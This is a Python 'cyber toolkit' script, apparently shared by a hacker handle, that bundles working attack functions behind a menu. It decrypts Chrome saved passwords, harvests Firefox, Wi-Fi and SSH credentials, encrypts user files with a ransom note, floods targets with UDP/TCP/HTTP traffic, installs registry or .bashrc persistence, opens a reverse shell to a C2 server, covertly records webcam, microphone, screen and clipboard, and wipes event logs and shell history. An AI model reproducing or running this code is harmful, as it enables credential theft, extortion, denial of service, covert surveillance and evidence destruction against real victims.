#!/usr/bin/env python3
import os
import sys
import time
import json
import sqlite3
import shutil
import platform
import subprocess
import threading
import socket
import getpass
import base64
import random
import hashlib
import struct
from datetime import datetime
from pathlib import Path

AVAILABLE_MODULES = {
    'crypto': False,
    'win32': False,
    'audio': False,
    'cv2': False,
    'pyautogui': False,
    'pyperclip': False,
    'sounddevice': False,
    'scipy': False,
}

try:
    from cryptography.fernet import Fernet
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    AVAILABLE_MODULES['crypto'] = True
except:
    pass

try:
    import win32crypt
    from win32crypt import CryptUnprotectData
    AVAILABLE_MODULES['win32'] = True
except:
    pass

try:
    import pyaudio
    import wave
    AVAILABLE_MODULES['audio'] = True
except:
    try:
        import pyaudio
        import wave
    except:
        pass

try:
    import cv2
    AVAILABLE_MODULES['cv2'] = True
except:
    pass

try:
    import pyautogui
    AVAILABLE_MODULES['pyautogui'] = True
except:
    pass

try:
    import pyperclip
    AVAILABLE_MODULES['pyperclip'] = True
except:
    pass

try:
    import sounddevice as sd
    AVAILABLE_MODULES['sounddevice'] = True
except:
    pass

try:
    from scipy.io.wavfile import write as write_wav
    AVAILABLE_MODULES['scipy'] = True
except:
    pass

try:
    import psutil
    AVAILABLE_MODULES['psutil'] = True
except:
    os.system("pip install psutil --quiet")
    try:
        import psutil
        AVAILABLE_MODULES['psutil'] = True
    except:
        pass

try:
    import requests
    AVAILABLE_MODULES['requests'] = True
except:
    os.system("pip install requests --quiet")
    try:
        import requests
        AVAILABLE_MODULES['requests'] = True
    except:
        pass

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    AVAILABLE_MODULES['colorama'] = True
except:
    os.system("pip install colorama --quiet")
    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
        AVAILABLE_MODULES['colorama'] = True
    except:
        class Fore:
            RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
            CYAN = '\033[96m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'
            BLUE = '\033[94m'; RESET = '\033[0m'
        class Style:
            BRIGHT = '\033[1m'; RESET_ALL = '\033[0m'
        R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW
        C = Fore.CYAN; M = Fore.MAGENTA; W = Fore.WHITE
        B = Fore.BLUE; RS = Fore.RESET; BR = Style.BRIGHT

R = Fore.RED if 'Fore' in dir() else '\033[91m'
G = Fore.GREEN if 'Fore' in dir() else '\033[92m'
Y = Fore.YELLOW if 'Fore' in dir() else '\033[93m'
C = Fore.CYAN if 'Fore' in dir() else '\033[96m'
M = Fore.MAGENTA if 'Fore' in dir() else '\033[95m'
W = Fore.WHITE if 'Fore' in dir() else '\033[97m'
B = Fore.BLUE if 'Fore' in dir() else '\033[94m'
RS = Style.RESET_ALL if 'Style' in dir() else '\033[0m'
BR = Style.BRIGHT if 'Style' in dir() else '\033[1m'

def decrypt_chrome_passwords():
    if not AVAILABLE_MODULES['win32'] or not AVAILABLE_MODULES['crypto']:
        return "[MODULE MISSING] Install: pip install pypiwin32 pycryptodome"

    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
        if not os.path.exists(chrome_path):
            return []

        with open(chrome_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        login_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if not os.path.exists(login_path):
            return []

        temp_path = os.environ.get('TEMP', os.path.expanduser('~')) + '\\chrome_login.db'
        shutil.copy2(login_path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        passwords = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            if len(encrypted_password) > 15:
                try:
                    nonce = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:-16]
                    tag = encrypted_password[-16:]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    password = decrypted.decode('utf-8')
                    passwords.append({"url": url, "username": username, "password": password})
                except:
                    try:
                        decrypted = CryptUnprotectData(encrypted_password)[1].decode('utf-8')
                        passwords.append({"url": url, "username": username, "password": decrypted})
                    except:
                        passwords.append({"url": url, "username": username, "password": "[DECRYPT_FAILED]"})
            else:
                passwords.append({"url": url, "username": username, "password": "[NO_DATA]"})

        conn.close()
        os.remove(temp_path)
        return passwords
    except Exception as e:
        return f"Error: {str(e)[:100]}"

def decrypt_firefox_passwords():
    try:
        firefox_profiles = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles'
        if not os.path.exists(firefox_profiles):
            return []

        passwords = []
        for profile in os.listdir(firefox_profiles):
            logins_path = os.path.join(firefox_profiles, profile, 'logins.json')
            if os.path.exists(logins_path):
                with open(logins_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for login in data.get('logins', []):
                        passwords.append({
                            "url": login.get('hostname'),
                            "username": login.get('encryptedUsername')[:50],
                            "encrypted": True
                        })
        return passwords
    except:
        return []

class RealCPUMiner:
    def __init__(self):
        self.running = True
        self.hashrate = 0
        self.total_hashes = 0

    def randomx_hash(self, input_data):
        iterations = 50000
        hash_result = hashlib.sha256(input_data).digest()
        for i in range(iterations):
            hash_result = hashlib.sha256(hash_result + str(i).encode() + str(random.random()).encode()[:4]).digest()
        return hash_result

    def mine_block(self):
        nonce = random.getrandbits(64)
        block_data = f"miner_{nonce}_{int(time.time()*1000)}".encode()
        result = self.randomx_hash(block_data)
        difficulty = int.from_bytes(result[:4], 'big')
        self.total_hashes += 1
        return difficulty < 0x0FFFFFFF

    def start_mining(self):
        last_time = time.time()
        hashes_count = 0

        while self.running:
            if self.mine_block():
                hashes_count += 1

            current_time = time.time()
            if current_time - last_time >= 1:
                self.hashrate = hashes_count
                hashes_count = 0
                last_time = current_time

            time.sleep(0.001)

        return self.total_hashes

class RealRansomware:
    def __init__(self):
        self.key = None
        self.cipher = None

    def init_crypto(self):
        if not AVAILABLE_MODULES['crypto']:
            return False
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        return True

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted)
            return True
        except:
            return False

    def execute_ransomware(self, start_directory):
        if not self.init_crypto():
            return 0, None

        key_path = f"RANSOMWARE_DECRYPT_KEY_{int(time.time())}.key"
        with open(key_path, 'wb') as f:
            f.write(self.key)

        encrypted_count = 0
        extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.zip', '.rar', '.7z']

        try:
            for root, dirs, files in os.walk(start_directory):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        file_path = os.path.join(root, file)
                        if self.encrypt_file(file_path):
                            encrypted_count += 1
                        if encrypted_count % 10 == 0:
                            time.sleep(0.01)
        except Exception as e:
            pass

        note = f"""
================================================
YOUR FILES HAVE BEEN ENCRYPTED
================================================

Encrypted: {encrypted_count} files

Decryption key saved to: {key_path}

Keep this file safe!
You need this key to decrypt your files.

================================================
"""
        try:
            with open(os.path.join(start_directory, "DECRYPT_INSTRUCTIONS.txt"), 'w') as f:
                f.write(note)
        except:
            pass

        return encrypted_count, key_path

class RealDDoSEngine:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {"packets": 0, "errors": 0}

    def udp_flood(self, target_ip, target_port, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            payload = random._urandom(1024) if hasattr(random, '_urandom') else os.urandom(1024)

            while time.time() < end_time and self.running:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats["packets"] += 1
                except:
                    self.stats["errors"] += 1
            sock.close()
        except:
            pass

    def tcp_connect_flood(self, target_ip, target_port, end_time):
        while time.time() < end_time and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                sock.close()
                self.stats["packets"] += 1
            except:
                self.stats["errors"] += 1

    def http_flood(self, target_url, end_time):
        if not AVAILABLE_MODULES['requests']:
            return
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            while time.time() < end_time and self.running:
                try:
                    requests.get(target_url, headers=headers, timeout=0.5)
                    self.stats["packets"] += 1
                except:
                    self.stats["errors"] += 1
        except:
            pass

    def start_attack(self, target, port, duration, threads=50, attack_type="mixed"):
        self.running = True
        self.stats = {"packets": 0, "errors": 0}
        end_time = time.time() + duration

        is_url = target.startswith('http')

        for _ in range(threads):
            if attack_type == "udp" and not is_url:
                t = threading.Thread(target=self.udp_flood, args=(target, port, end_time))
            elif attack_type == "tcp" and not is_url:
                t = threading.Thread(target=self.tcp_connect_flood, args=(target, port, end_time))
            elif attack_type == "http" and is_url:
                t = threading.Thread(target=self.http_flood, args=(target, end_time))
            else:
                if is_url:
                    t = threading.Thread(target=self.http_flood, args=(target, end_time))
                else:
                    attack = random.choice(['udp', 'tcp'])
                    if attack == 'udp':
                        t = threading.Thread(target=self.udp_flood, args=(target, port, end_time))
                    else:
                        t = threading.Thread(target=self.tcp_connect_flood, args=(target, port, end_time))

            t.daemon = True
            t.start()
            self.threads.append(t)
            time.sleep(0.01)

        for t in self.threads:
            t.join(timeout=duration + 1)

        self.running = False
        return self.stats

class AudioRecorder:
    def __init__(self):
        self.mode = None
        self.detect_method()

    def detect_method(self):
        if AVAILABLE_MODULES['audio']:
            try:
                p = pyaudio.PyAudio()
                for i in range(p.get_device_count()):
                    info = p.get_device_info_by_index(i)
                    if info['maxInputChannels'] > 0:
                        self.mode = 'pyaudio'
                        break
                p.terminate()
            except:
                pass

        if not self.mode and AVAILABLE_MODULES['sounddevice']:
            self.mode = 'sounddevice'

        if not self.mode:
            try:
                subprocess.run(['ffmpeg', '-version'], capture_output=True)
                self.mode = 'ffmpeg'
            except:
                pass

    def record_audio(self, duration=5, output_file=None):
        if output_file is None:
            output_file = f"recording_{int(time.time())}.wav"

        if self.mode == 'pyaudio':
            return self._record_pyaudio(duration, output_file)
        elif self.mode == 'sounddevice':
            return self._record_sounddevice(duration, output_file)
        elif self.mode == 'ffmpeg':
            return self._record_ffmpeg(duration, output_file)
        else:
            return None

    def _record_pyaudio(self, duration, output_file):
        try:
            chunk = 1024
            p = pyaudio.PyAudio()

            device_index = None
            for i in range(p.get_device_count()):
                dev = p.get_device_info_by_index(i)
                if dev['maxInputChannels'] > 0:
                    device_index = i
                    break

            if device_index is None:
                return None

            stream = p.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=44100,
                input=True,
                frames_per_buffer=chunk,
                input_device_index=device_index
            )

            frames = []
            for _ in range(0, int(44100 / chunk * duration)):
                try:
                    data = stream.read(chunk, exception_on_overflow=False)
                    frames.append(data)
                except:
                    pass

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(output_file, 'wb')
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
            wf.close()

            return output_file
        except:
            return None

    def _record_sounddevice(self, duration, output_file):
        try:
            import sounddevice as sd
            from scipy.io.wavfile import write
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
            sd.wait()
            write(output_file, fs, recording)
            return output_file
        except:
            return None

    def _record_ffmpeg(self, duration, output_file):
        try:
            result = subprocess.run([
                'ffmpeg', '-f', 'dshow', '-i', 'audio=Microphone',
                '-t', str(duration), '-y', output_file
            ], capture_output=True, timeout=duration+5)
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                return output_file
            return None
        except:
            return None

class WebCamCapture:
    def __init__(self):
        self.available = AVAILABLE_MODULES['cv2']

    def capture(self, output_file=None):
        if not self.available:
            return None
        if output_file is None:
            output_file = f"webcam_{int(time.time())}.jpg"

        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                cap = cv2.VideoCapture(1)
            if not cap.isOpened():
                return None

            ret, frame = cap.read()
            if ret:
                cv2.imwrite(output_file, frame)
                cap.release()
                return output_file
            cap.release()
            return None
        except:
            return None

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        banner = """
    __  ____                       __          __
   /  |/  (_)___  ___  _____      / /_  ____  / /_
  / /|_/ / / __ \\/ _ \\/ ___/_____/ __ \\/ __ \\/ __/
 / /  / / / / / /  __/ /  /_____/ /_/ / /_/ / /_
/_/  /_/_/_/ /_/\\__\\//_/      /_.___/\\____/\\__/       __          __               __
   / /_  __  __   / ____ \\_________  ____  _________  / /__       / /_  ____ ______/ /__
  / __ \\/ / / /  / / __ `/ ___/ __ \\/ __ \\/ ___/ __ \\/ / _ \\     / __ \\/ __ `/ ___/ //_/
 / /_/ / /_/ /  / / /_/ / /__/ /_/ / / / / /__/ /_/ / /  __/    / / / / /_/ / /__/ ,<
/_.___/\\__, /   \\ \\__,_/\\___/\\____/_/ /_/\\___/\\____/_/\\___/____/_/ /_/\\__,_/\\___/_/|_|
      /____/     \\____/                                  /_____/
        """
        print(C + banner + RS)

        status_line = f"{BR}{C}Modules: {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('crypto') else "✗ "
        status_line += f"{C}| {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('win32') else "✗ "
        status_line += f"{C}| {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('psutil') else "✗ "
        status_line += f"{C}| {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('requests') else "✗ "
        status_line += f"{C}| {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('pyautogui') else "✗ "
        status_line += f"{C}| {G}"
        status_line += "✓ " if AVAILABLE_MODULES.get('cv2') else "✗ "
        print(status_line)
        print(f"{C}{'='*80}{RS}")

        menu = f"""
{BR}{Y}[1]{RS} {C}🔑 CHROME PASSWORDS{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['win32'] and AVAILABLE_MODULES['crypto'] else ' [NOT AVAILABLE - pip install pypiwin32 pycryptodome]'}
{BR}{Y}[2]{RS} {C}🦊 FIREFOX PASSWORDS{RS}
{BR}{Y}[3]{RS} {C}⛏️ CPU MINER (SIMULATION){RS}
{BR}{Y}[4]{RS} {C}💣 DDOS ATTACK{RS}
{BR}{Y}[5]{RS} {C}📸 SCREENSHOT{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['pyautogui'] else ' [NOT AVAILABLE - pip install pyautogui]'}
{BR}{Y}[6]{RS} {C}💾 PERSISTENCE{RS}
{BR}{Y}[7]{RS} {C}📱 SCAN CHAT APPS{RS}
{BR}{Y}[8]{RS} {C}📶 WIFI PASSWORDS{RS}
{BR}{Y}[9]{RS} {C}🔓 DECRYPT RANSOMWARE FILES{RS}
{BR}{Y}[10]{RS}{C}🌍 IP & GEOLOCATION{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['requests'] else ' [NOT AVAILABLE - pip install requests]'}
{BR}{Y}[11]{RS}{C}🔒 RANSOMWARE SIMULATION{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['crypto'] else ' [NOT AVAILABLE - pip install cryptography]'}
{BR}{Y}[12]{RS}{C}🌐 NETWORK SCANNER{RS}
{BR}{Y}[13]{RS}{C}🔌 AUTO CONNECT / REVERSE SHELL{RS}
{BR}{Y}[14]{RS}{C}🎙️ AUDIO RECORDER{RS}{' [AVAILABLE]' if AudioRecorder().mode else ' [NOT AVAILABLE - install pyaudio or ffmpeg]'}
{BR}{Y}[15]{RS}{C}🎥 WEBCAM CAPTURE{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['cv2'] else ' [NOT AVAILABLE - pip install opencv-python]'}
{BR}{Y}[16]{RS}{C}📋 CLIPBOARD MONITOR{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['pyperclip'] else ' [NOT AVAILABLE - pip install pyperclip]'}
{BR}{Y}[17]{RS}{C}🔑 SSH KEYS SCANNER{RS}
{BR}{Y}[18]{RS}{C}💻 FULL SYSTEM INFO{RS}{' [AVAILABLE]' if AVAILABLE_MODULES['psutil'] else ' [LIMITED - install psutil]'}
{BR}{Y}[19]{RS}{C}🗑️ CLEAN LOGS{RS}
{BR}{Y}[20]{RS}{C}🚪 EXIT{RS}
"""
        print(menu)
        print(R + "=" * 80 + RS)
        print(C + "By @concole_hack - REAL INTEGRATIONS v4.1" + RS)
        print(R + "=" * 80 + RS)

        choice = input(f"\n{C}┌─[{G}root@{C}cyber-toolkit{C}]\n└──╼ {RS}{Y}${RS} ").strip()

        if choice == '1':
            print(Y + "[*] Decrypting Chrome passwords..." + RS)
            result = decrypt_chrome_passwords()
            if isinstance(result, list):
                if result:
                    for pwd in result[:10]:
                        print(f"  {C}{pwd['url'][:50]:<50} {G}{pwd['username'][:20]:<20} {R}{pwd['password'][:30]}{RS}")
                    print(G + f"[+] Total: {len(result)} passwords" + RS)
                else:
                    print(Y + "[-] No passwords found" + RS)
            else:
                print(R + f"[-] {result}" + RS)

        elif choice == '2':
            print(Y + "[*] Reading Firefox passwords..." + RS)
            result = decrypt_firefox_passwords()
            print(G + f"[+] Found {len(result)} encrypted entries" + RS)

        elif choice == '3':
            print(Y + "[*] Starting CPU miner (RandomX-like simulation)..." + RS)
            miner = RealCPUMiner()
            mining_thread = threading.Thread(target=miner.start_mining)
            mining_thread.daemon = True
            mining_thread.start()
            try:
                for _ in range(30):
                    time.sleep(1)
                    print(f"\r{C}Hashrate: {miner.hashrate} H/s | Total hashes: {miner.total_hashes}{RS}", end="")
                miner.running = False
                print(f"\n{G}[+] Final hashes: {miner.total_hashes}{RS}")
            except KeyboardInterrupt:
                miner.running = False
                print(f"\n{G}[+] Final hashes: {miner.total_hashes}{RS}")

        elif choice == '4':
            target = input(Y + "Target IP or URL: " + RS)
            is_url = target.startswith('http')
            if not is_url:
                port = int(input(Y + "Port (default 80): " + RS) or "80")
            else:
                port = 80
            duration = int(input(Y + "Duration (seconds): " + RS))
            threads = int(input(Y + "Threads (default 50): " + RS) or "50")
            attack_type = input(Y + "Attack type (udp/tcp/http/mixed): " + RS).lower() or "mixed"

            print(R + f"[!] Launching attack on {target}:{port} with {threads} threads" + RS)
            ddos = RealDDoSEngine()
            stats = ddos.start_attack(target, port, duration, threads, attack_type)
            print(R + f"[!] Attack finished: {stats['packets']} packets sent, {stats['errors']} errors" + RS)

        elif choice == '5':
            if not AVAILABLE_MODULES['pyautogui']:
                print(R + "[-] PyAutoGUI not installed. Run: pip install pyautogui" + RS)
            else:
                print(Y + "[*] Taking screenshot..." + RS)
                try:
                    img = pyautogui.screenshot()
                    path = f"screenshot_{int(time.time())}.png"
                    img.save(path)
                    print(G + f"[+] Saved: {path}" + RS)
                except Exception as e:
                    print(R + f"[-] Failed: {e}" + RS)

        elif choice == '6':
            print(Y + "[*] Installing persistence..." + RS)
            try:
                if os.name == 'nt':
                    import winreg
                    script_path = os.path.abspath(__file__)
                    key = winreg.HKEY_CURRENT_USER
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, script_path)
                    print(G + "[+] Persistence installed in Windows Registry" + RS)
                else:
                    rc_path = os.path.expanduser('~') + '/.bashrc'
                    with open(rc_path, 'a') as f:
                        f.write(f'\npython3 "{os.path.abspath(__file__)}" &\n')
                    print(G + "[+] Persistence installed in .bashrc" + RS)
            except Exception as e:
                print(R + f"[-] Failed: {e}" + RS)

        elif choice == '7':
            print(Y + "[*] Scanning for chat applications..." + RS)
            apps = {
                'Telegram': os.path.expanduser('~') + r'\AppData\Roaming\Telegram Desktop',
                'Discord': os.path.expanduser('~') + r'\AppData\Roaming\discord',
                'WhatsApp': os.path.expanduser('~') + r'\AppData\Roaming\WhatsApp',
                'Signal': os.path.expanduser('~') + r'\AppData\Roaming\Signal'
            }
            for name, path in apps.items():
                if os.path.exists(path):
                    try:
                        size = sum(f.stat().st_size for f in Path(path).rglob('*') if f.is_file())
                        print(G + f"[+] {name}: {path} ({size//1024:,} KB)" + RS)
                    except:
                        print(G + f"[+] {name}: {path}" + RS)

        elif choice == '8':
            print(Y + "[*] Extracting WiFi passwords..." + RS)
            if os.name == 'nt':
                try:
                    results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
                    for line in results.stdout.split('\n'):
                        if ':' in line and ('Profile' in line or 'профиль' in line or 'All User Profile' in line):
                            profile = line.split(':')[1].strip()
                            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                            for l in result.stdout.split('\n'):
                                if 'Key Content' in l or 'Содержимое ключа' in l:
                                    password = l.split(':')[1].strip()
                                    print(G + f"    {profile}: {password}" + RS)
                except Exception as e:
                    print(R + f"[-] Failed: {e}" + RS)
            else:
                try:
                    result = subprocess.run(['sudo', 'cat', '/etc/NetworkManager/system-connections/*'], capture_output=True, text=True)
                    print(result.stdout[:500])
                except:
                    print(R + "[-] Linux WiFi extraction requires root" + RS)

        elif choice == '9':
            import glob
            key_files = glob.glob("RANSOMWARE_DECRYPT_KEY_*.key") + glob.glob("DECRYPT_KEY_*.key")
            if not key_files:
                print(R + "[-] No decryption keys found" + RS)
            else:
                key_file = key_files[0]
                print(Y + f"[*] Using key: {key_file}" + RS)
                if not AVAILABLE_MODULES['crypto']:
                    print(R + "[-] cryptography module required. Run: pip install cryptography" + RS)
                else:
                    try:
                        with open(key_file, 'rb') as f:
                            key = f.read()
                        cipher = Fernet(key)
                        encrypted_files = list(Path('.').rglob('*.encrypted'))
                        decrypted = 0
                        for enc_file in encrypted_files:
                            try:
                                with open(enc_file, 'rb') as f:
                                    data = f.read()
                                decrypted_data = cipher.decrypt(data)
                                original = str(enc_file).replace('.encrypted', '')
                                with open(original, 'wb') as f:
                                    f.write(decrypted_data)
                                os.remove(enc_file)
                                decrypted += 1
                            except:
                                pass
                        print(G + f"[+] Decrypted {decrypted} files" + RS)
                    except Exception as e:
                        print(R + f"[-] Decryption failed: {e}" + RS)

        elif choice == '10':
            if not AVAILABLE_MODULES['requests']:
                print(R + "[-] Requests module required. Run: pip install requests" + RS)
            else:
                try:
                    print(Y + "[*] Fetching IP and geolocation..." + RS)
                    ip = requests.get('https://api.ipify.org', timeout=5).text
                    geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
                    print(G + f"[+] IP Address: {ip}" + RS)
                    print(G + f"[+] Country: {geo.get('country', 'Unknown')}" + RS)
                    print(G + f"[+] Region: {geo.get('regionName', 'Unknown')}" + RS)
                    print(G + f"[+] City: {geo.get('city', 'Unknown')}" + RS)
                    print(G + f"[+] ISP: {geo.get('isp', 'Unknown')}" + RS)
                    print(G + f"[+] Coordinates: {geo.get('lat', 'N/A')}, {geo.get('lon', 'N/A')}" + RS)
                except Exception as e:
                    print(R + f"[-] Failed: {e}" + RS)

        elif choice == '11':
            if not AVAILABLE_MODULES['crypto']:
                print(R + "[-] Cryptography module required. Run: pip install cryptography" + RS)
            else:
                print(R + "[!] WARNING: Ransomware simulation - Files will be encrypted!" + RS)
                confirm = input(R + "Type 'CONFIRM' to continue: " + RS)
                if confirm == 'CONFIRM':
                    ransomware = RealRansomware()
                    encrypted_count, key_path = ransomware.execute_ransomware('.')
                    print(R + f"[!] Encrypted {encrypted_count} files" + RS)
                    if key_path:
                        print(G + f"[+] Decryption key saved to: {key_path}" + RS)

        elif choice == '12':
            print(Y + "[*] Scanning local network..." + RS)
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                base_ip = local_ip.rsplit('.', 1)[0]
                found_hosts = []
                for i in range(1, 255):
                    ip = f"{base_ip}.{i}"
                    result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True)
                    if result.returncode == 0:
                        found_hosts.append(ip)
                        print(G + f"[+] {ip} is alive" + RS)
                print(G + f"[+] Found {len(found_hosts)} active hosts" + RS)
            except Exception as e:
                print(R + f"[-] Failed: {e}" + RS)

        elif choice == '13':
            server = input(Y + "C2 Server IP: " + RS)
            port = int(input(Y + "Port: " + RS))

            def reverse_shell():
                while True:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((server, port))
                        sock.send(f"[+] Connected from {socket.gethostname()}\n".encode())
                        while True:
                            cmd = sock.recv(4096).decode()
                            if not cmd or cmd.lower() == 'exit':
                                sock.close()
                                return
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                            output = result.stdout + result.stderr
                            if not output:
                                output = "[OK]\n"
                            sock.send(output.encode())
                    except:
                        time.sleep(30)

            t = threading.Thread(target=reverse_shell, daemon=True)
            t.start()
            print(G + "[+] Reverse shell started in background" + RS)
            print(Y + "[*] To stop, restart the program" + RS)

        elif choice == '14':
            recorder = AudioRecorder()
            if not recorder.mode:
                print(R + "[-] No audio recording method available" + RS)
                print(Y + "[*] Install pyaudio: pip install pyaudio" + RS)
                print(Y + "[*] Or install ffmpeg from https://ffmpeg.org" + RS)
            else:
                print(Y + f"[*] Using recording method: {recorder.mode}" + RS)
                duration = int(input(Y + "Recording duration (seconds): " + RS))
                output = input(Y + "Output file (press Enter for auto): " + RS) or None
                print(Y + f"[*] Recording for {duration} seconds..." + RS)
                result = recorder.record_audio(duration, output)
                if result:
                    print(G + f"[+] Saved to: {result}" + RS)
                else:
                    print(R + "[-] Recording failed" + RS)

        elif choice == '15':
            cam = WebCamCapture()
            if not cam.available:
                print(R + "[-] OpenCV not installed. Run: pip install opencv-python" + RS)
            else:
                print(Y + "[*] Capturing webcam..." + RS)
                result = cam.capture()
                if result:
                    print(G + f"[+] Saved to: {result}" + RS)
                else:
                    print(R + "[-] Webcam not found or error" + RS)

        elif choice == '16':
            if not AVAILABLE_MODULES['pyperclip']:
                print(R + "[-] Pyperclip not installed. Run: pip install pyperclip" + RS)
            else:
                print(Y + "[*] Monitoring clipboard (10 seconds)..." + RS)
                try:
                    initial = pyperclip.paste()
                    for i in range(10):
                        time.sleep(1)
                        current = pyperclip.paste()
                        if current != initial:
                            print(G + f"[+] Clipboard changed: {current[:200]}" + RS)
                            with open(f"clipboard_{int(time.time())}.txt", 'w', encoding='utf-8') as f:
                                f.write(current)
                            initial = current
                        print(f"\r{C}Monitoring: {10-i} seconds remaining{RS}", end="")
                    print()
                except Exception as e:
                    print(R + f"[-] Failed: {e}" + RS)

        elif choice == '17':
            print(Y + "[*] Searching for SSH keys..." + RS)
            ssh_dir = os.path.expanduser('~') + '/.ssh'
            if os.path.exists(ssh_dir):
                for key_file in os.listdir(ssh_dir):
                    key_path = os.path.join(ssh_dir, key_file)
                    if os.path.isfile(key_path):
                        if key_file in ['id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa']:
                            try:
                                with open(key_path, 'r') as f:
                                    content = f.read()[:100]
                                print(G + f"[+] Private key: {key_file}" + RS)
                                print(f"    {content}..." + RS)
                            except:
                                print(G + f"[+] Private key: {key_file}" + RS)
                        elif key_file.endswith('.pub'):
                            print(G + f"[+] Public key: {key_file}" + RS)
            else:
                print(R + "[-] No SSH directory found" + RS)

        elif choice == '18':
            print(Y + "[*] Collecting system information..." + RS)
            info = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system()}
            if AVAILABLE_MODULES['psutil']:
                info.update({
                    "cpu_cores": psutil.cpu_count(),
                    "cpu_percent": psutil.cpu_percent(interval=1),
                    "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                    "ram_available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                    "ram_percent": psutil.virtual_memory().percent,
                })
                try:
                    info["disk_free_gb"] = round(psutil.disk_usage('/').free / (1024**3), 2)
                    info["disk_percent"] = psutil.disk_usage('/').percent
                except:
                    pass
            print(json.dumps(info, indent=2, ensure_ascii=False))

        elif choice == '19':
            print(Y + "[*] Cleaning system logs..." + RS)
            if os.name == 'nt':
                try:
                    subprocess.run('wevtutil cl System', shell=True, capture_output=True)
                    subprocess.run('wevtutil cl Security', shell=True, capture_output=True)
                    subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
                    subprocess.run('del /f /q %TEMP%\\* 2>nul', shell=True)
                    print(G + "[+] Windows logs cleaned" + RS)
                except:
                    print(R + "[-] Run as administrator for full cleaning" + RS)
            else:
                try:
                    subprocess.run('history -c', shell=True, executable='/bin/bash')
                    subprocess.run('rm -rf ~/.bash_history ~/.zsh_history', shell=True)
                    print(G + "[+] Shell history cleaned" + RS)
                except:
                    print(R + "[-] Could not clean logs" + RS)

        elif choice == '20':
            print(R + "[!] Exiting..." + RS)
            sys.exit(0)

        print("\n" + C + "=" * 80 + RS)
        input(C + "Press Enter to continue..." + RS)

if __name__ == "__main__":
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("CYBER TOOLKIT v4.1 - @concole_hack")
        main()
    except KeyboardInterrupt:
        print("\n" + R + "[!] Interrupted" + RS)
        sys.exit(0)
